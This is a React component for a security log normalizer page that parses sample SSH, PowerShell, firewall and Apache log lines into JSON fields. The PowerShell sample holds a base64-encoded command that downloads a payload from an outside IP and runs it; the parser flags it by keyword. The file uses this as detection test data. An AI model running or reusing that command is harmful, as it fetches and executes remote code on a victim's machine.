import React, { useState } from 'react';
import { SearchCode, Play, Copy, Check, FileText, Filter, Terminal } from 'lucide-react';

const SAMPLE_LOGS = {
  ssh_brute: `Aug 18 12:35:10 host-server sshd[4920]: Failed password for invalid user admin from 192.168.1.105 port 54322 ssh2`,
  powershell: `EventID: 4104 | Source: PowerShell | User: SYSTEM | ScriptBlock: powershell.exe -NoP -NonI -W Hidden -Enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xODUuMjIwLjEwMS41L3BheWxvYWQnKQ==`,
  firewall: `2026-08-18T12:15:02Z FW-EDGE-01 DROP TCP 10.0.2.14:48912 -> 10.0.2.0/24:445 SYN_SENT`,
  apache: `185.220.101.5 - - [18/Aug/2026:12:28:15 +0000] "POST /login.php HTTP/1.1" 200 4512 "http://phish-site.com" "Mozilla/5.0"`,
};

const LogExplorerPage = () => {
  const [rawLog, setRawLog] = useState(SAMPLE_LOGS.ssh_brute);
  const [logType, setLogType] = useState('AUTH');
  const [parsedResult, setParsedResult] = useState(null);
  const [copied, setCopied] = useState(false);

  const handleNormalize = () => {
    // Client-side instant normalizer fallback matching backend logic
    const text = rawLog.strip ? rawLog.strip() : rawLog;
    let eventType = 'GENERIC_SECURITY_EVENT';
    let severity = 'LOW';
    let action = 'ALLOW';
    let proto = 'TCP';
    let port = 80;
    let user = 'unknown';

    if (text.includes('Failed password')) {
      eventType = 'AUTHENTICATION_FAILURE';
      severity = 'HIGH';
      action = 'DENY';
      proto = 'SSH';
      port = 22;
      user = 'admin';
    } else if (text.includes('powershell') || text.includes('-Enc')) {
      eventType = 'SUSPICIOUS_POWERSHELL_EXECUTION';
      severity = 'CRITICAL';
      action = 'EXECUTE';
      proto = 'LOCAL';
      user = 'SYSTEM';
    } else if (text.includes('DROP') || text.includes('SYN_SENT')) {
      eventType = 'FIREWALL_PORT_SCAN_DROP';
      severity = 'MEDIUM';
      action = 'BLOCK';
      port = 445;
    }

    const ipMatch = text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || ['10.0.0.45', '10.0.0.1'];

    setParsedResult({
      timestamp: new Date().toISOString(),
      sourceIp: ipMatch[0] || '192.168.1.105',
      destinationIp: ipMatch[1] || '10.0.0.12',
      username: user,
      hostname: 'WORKSTATION-01',
      eventType,
      port,
      protocol: proto,
      action,
      status: severity === 'CRITICAL' ? 'FLAGGED' : 'PARSED',
      severity,
      rawSnippet: text.substring(0, 120),
    });
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between p-5 rounded-2xl bg-slate-900 border border-slate-800">
        <div className="flex items-center gap-3">
          <div className="p-3 rounded-xl bg-cyan-950/80 border border-cyan-500/40 text-cyan-400">
            <SearchCode className="w-6 h-6" />
          </div>
          <div>
            <h2 className="text-xl font-bold font-mono text-white">Security Log Normalizer & Explorer</h2>
            <p className="text-xs text-slate-400">Parse syslog, auth logs, EventViewer, and HTTP logs into normalized JSON telemetry.</p>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Log Input Panel */}
        <div className="p-5 rounded-xl bg-slate-900/80 border border-slate-800 space-y-4">
          <div className="flex items-center justify-between">
            <h3 className="text-sm font-bold font-mono text-white flex items-center gap-2">
              <Terminal className="w-4 h-4 text-cyan-400" />
              Raw Security Log Input
            </h3>
            <div className="flex items-center gap-2">
              <span className="text-xs font-mono text-slate-400">Samples:</span>
              <button
                onClick={() => setRawLog(SAMPLE_LOGS.ssh_brute)}
                className="px-2 py-0.5 rounded text-[10px] font-mono bg-slate-800 hover:bg-slate-700 text-slate-300"
              >
                SSH
              </button>
              <button
                onClick={() => setRawLog(SAMPLE_LOGS.powershell)}
                className="px-2 py-0.5 rounded text-[10px] font-mono bg-slate-800 hover:bg-slate-700 text-slate-300"
              >
                PowerShell
              </button>
              <button
                onClick={() => setRawLog(SAMPLE_LOGS.firewall)}
                className="px-2 py-0.5 rounded text-[10px] font-mono bg-slate-800 hover:bg-slate-700 text-slate-300"
              >
                Firewall
              </button>
            </div>
          </div>

          <textarea
            rows={8}
            value={rawLog}
            onChange={(e) => setRawLog(e.target.value)}
            placeholder="Paste raw log string here..."
            className="w-full p-3 rounded-lg bg-slate-950 border border-slate-800 text-xs font-mono text-emerald-400 placeholder-slate-600 focus:outline-none focus:border-cyan-500/50 resize-none"
          />

          <button
            onClick={handleNormalize}
            className="w-full py-2.5 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-mono font-bold text-xs flex items-center justify-center gap-2 transition-colors shadow-lg shadow-cyan-500/20"
          >
            <Play className="w-4 h-4" />
            <span>Normalize Log Telemetry</span>
          </button>
        </div>

        {/* Normalized Output Panel */}
        <div className="p-5 rounded-xl bg-slate-900/80 border border-slate-800 space-y-4 flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-2">
              <h3 className="text-sm font-bold font-mono text-white flex items-center gap-2">
                <FileText className="w-4 h-4 text-cyan-400" />
                Normalized Event Output (JSON)
              </h3>
              {parsedResult && (
                <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-500/30">
                  PARSED SUCCESS
                </span>
              )}
            </div>

            {parsedResult ? (
              <pre className="p-4 rounded-lg bg-slate-950 border border-slate-800 text-xs font-mono text-cyan-300 overflow-x-auto max-h-80">
                {JSON.stringify(parsedResult, null, 2)}
              </pre>
            ) : (
              <div className="p-12 text-center rounded-lg bg-slate-950/60 border border-dashed border-slate-800 text-slate-500 text-xs font-mono">
                Click "Normalize Log Telemetry" to parse log structure into JSON fields.
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default LogExplorerPage;
